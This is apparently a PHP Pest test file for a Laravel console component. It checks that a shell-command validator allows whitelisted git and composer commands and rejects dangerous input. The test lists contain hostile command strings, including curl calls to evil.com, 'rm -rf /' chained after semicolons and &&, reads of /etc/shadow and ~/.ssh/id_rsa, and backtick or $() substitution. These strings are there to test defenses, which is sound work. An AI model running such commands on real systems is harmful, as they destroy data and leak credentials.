<?php

use Codenzia\BrowserConsole\Livewire\BrowserConsole;

/**
 * Test the shell command validation logic via reflection,
 * since validateShellCommand and rejectShellOperators are private methods.
 */
beforeEach(function () {
    $this->component = new BrowserConsole;

    // Use reflection to access private methods
    $this->validator = new ReflectionMethod(BrowserConsole::class, 'validateShellCommand');
    $this->validator->setAccessible(true);

    $this->operatorCheck = new ReflectionMethod(BrowserConsole::class, 'rejectShellOperators');
    $this->operatorCheck->setAccessible(true);
});

it('allows whitelisted commands', function () {
    $allowed = ['git status', 'ls -la', 'pwd', 'whoami', 'php -v', 'composer show', 'df -h'];

    foreach ($allowed as $cmd) {
        $result = $this->validator->invoke($this->component, $cmd);
        expect($result)->toBeTrue("Expected '{$cmd}' to be allowed");
    }
});

it('blocks non-whitelisted commands', function () {
    $blocked = ['curl https://evil.com', 'wget file', 'apt install', 'npm install', 'node script.js'];

    foreach ($blocked as $cmd) {
        $result = $this->validator->invoke($this->component, $cmd);
        expect($result)->toBeString("Expected '{$cmd}' to be blocked");
    }
});

it('blocks shell operators', function () {
    $dangerous = [
        'ls; rm -rf /',
        'ls && cat /etc/passwd',
        'ls || echo fail',
        'ls | grep test',
        'echo test > file',
        'echo test >> file',
        'ls < input',
        'echo `whoami`',
        'echo $(whoami)',
        'echo ${HOME}',
    ];

    foreach ($dangerous as $cmd) {
        $result = $this->validator->invoke($this->component, $cmd);
        expect($result)->toBeString("Expected '{$cmd}' to be blocked due to operator");
    }
});

it('blocks dangerous patterns', function () {
    $dangerous = [
        'git push origin main',
        'git reset --hard HEAD',
        'git clean -fd',
        'cat ../../etc/passwd',
        'cat /etc/shadow',
        'ls /root',
        'ls /proc/1',
        'ls /sys/class',
        'chmod 777 file',
        'php -r "echo 1;"',
        'php script.php',
        'composer global require',
        'composer create-project',
        'composer exec phpunit',
        'composer run test',
    ];

    foreach ($dangerous as $cmd) {
        $result = $this->validator->invoke($this->component, $cmd);
        expect($result)->toBeString("Expected '{$cmd}' to be blocked");
    }
});

it('blocks control characters', function () {
    $result = $this->validator->invoke($this->component, "ls\x00 -la");
    expect($result)->toBeString();
});

it('blocks shell variable expansion', function () {
    $result = $this->validator->invoke($this->component, 'cat $HOME/.ssh/id_rsa');
    expect($result)->toBeString();

    $result = $this->validator->invoke($this->component, 'ls ~');
    expect($result)->toBeString();
});

it('allows safe git commands', function () {
    $safe = [
        'git status',
        'git log --oneline -15',
        'git pull',
        'git diff --stat',
        'git branch -a',
        'git remote -v',
    ];

    foreach ($safe as $cmd) {
        $result = $this->validator->invoke($this->component, $cmd);
        expect($result)->toBeTrue("Expected '{$cmd}' to be allowed");
    }
});

it('allows safe composer commands', function () {
    $safe = [
        'composer install --no-dev',
        'composer update --no-dev',
        'composer show --installed',
        'composer diagnose',
        'composer dump-autoload -o',
    ];

    foreach ($safe as $cmd) {
        $result = $this->validator->invoke($this->component, $cmd);
        expect($result)->toBeTrue("Expected '{$cmd}' to be allowed");
    }
});

// ── rejectShellOperators (shared by artisan + shell modes) ──

it('rejectShellOperators blocks shell operators', function () {
    $dangerous = [
        'list; curl evil.com',
        'migrate && rm -rf /',
        'migrate || echo fail',
        'route:list | grep api',
        'export > file',
        'echo `whoami`',
        'echo $(id)',
        'echo ${PATH}',
    ];

    foreach ($dangerous as $input) {
        $result = $this->operatorCheck->invoke($this->component, $input);
        expect($result)->toBeString("Expected rejectShellOperators to block '{$input}'");
    }
});

it('rejectShellOperators allows clean input', function () {
    $safe = [
        'migrate --force',
        'route:list --json',
        'cache:clear',
        'optimize',
        'db:seed --class=DemoSeeder --force',
    ];

    foreach ($safe as $input) {
        $result = $this->operatorCheck->invoke($this->component, $input);
        expect($result)->toBeTrue("Expected rejectShellOperators to allow '{$input}'");
    }
});

it('rejectShellOperators blocks control characters', function () {
    $result = $this->operatorCheck->invoke($this->component, "migrate\x00--force");
    expect($result)->toBeString();

    $result = $this->operatorCheck->invoke($this->component, "migrate\n--force");
    expect($result)->toBeString();
});

it('blocks backslash-escaped dollar sign and tilde', function () {
    // Previously these bypassed validation via negative lookbehind — now blocked unconditionally
    $result = $this->operatorCheck->invoke($this->component, 'cat \$HOME/.ssh/id_rsa');
    expect($result)->toBeString('Backslash-escaped $HOME should be blocked');

    $result = $this->operatorCheck->invoke($this->component, 'ls \~');
    expect($result)->toBeString('Backslash-escaped ~ should be blocked');

    $result = $this->validator->invoke($this->component, 'cat \$HOME/.ssh/id_rsa');
    expect($result)->toBeString('Shell validator should also block escaped $HOME');
});
